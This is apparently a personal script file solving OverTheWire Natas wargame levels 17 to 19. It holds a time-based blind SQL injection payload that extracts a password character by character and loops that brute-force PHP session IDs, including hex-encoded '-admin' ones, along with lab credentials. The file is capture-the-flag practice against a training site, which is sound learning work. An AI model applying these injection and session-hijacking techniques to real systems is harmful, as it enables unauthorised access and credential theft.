#import string
#import requests

#characters = string.ascii_letters + string.digits
#url = "http://natas17.natas.labs.overthewire.org/"
#auth_username = "natas17"
#auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
#password = ""
#passlength = 32

# go through the loop till password is 32 characters long and then go into the loop passing all characters
#while len(password) != 32:
#    for char in characters:
#        data = {'username': 'natas18" AND password LIKE BINARY "' + password + char + '%" and sleep(2) #'}
#        r = requests.post(url, data=data, auth=(auth_username, auth_password))
#        if (r.elapsed.seconds > 1):
#            password += char
#            print("Password: {0}".format(password))

#!/bin/python3

#import requests
#maxid = 641
#url = "http://natas18.natas.labs.overthewire.org"
#user = "natas18"
#passwd = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
#match = "You are an admin. The credentials for the next level are:"

#for i in range(maxid):
#    c = dict(PHPSESSID=str(i))
#    h = requests.get(url, auth=(user, passwd), cookies=c)
#    if match in str(h.content):
#        print (i)
#        print (h.content)
#        break

#import binascii
#print(bytes('what',encoding='utf-8'))
#print(hex(b'what'))

#!/bin/python3
import requests
import binascii

def str2byte(s):
 return bytes(s, encoding='utf-8')

def byte2hex(b):
 return ''.join([hex(n)[2:].rjust(2,'0') for n in b])

def str2hex(s):
 return byte2hex(str2byte(s))

maxid = 641
user = "natas19"
passwd = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" 
url = "http://"+user+".natas.labs.overthewire.org"
admin = '-admin'
match = "You are an admin. The credentials for the next level are:"

for i in range(maxid):
 c = dict(PHPSESSID=str2hex(str(i)+admin))
 h = requests.get(url, auth=(user, passwd), cookies=c)
 if match in str(h.content):
     print (h.content)
     break
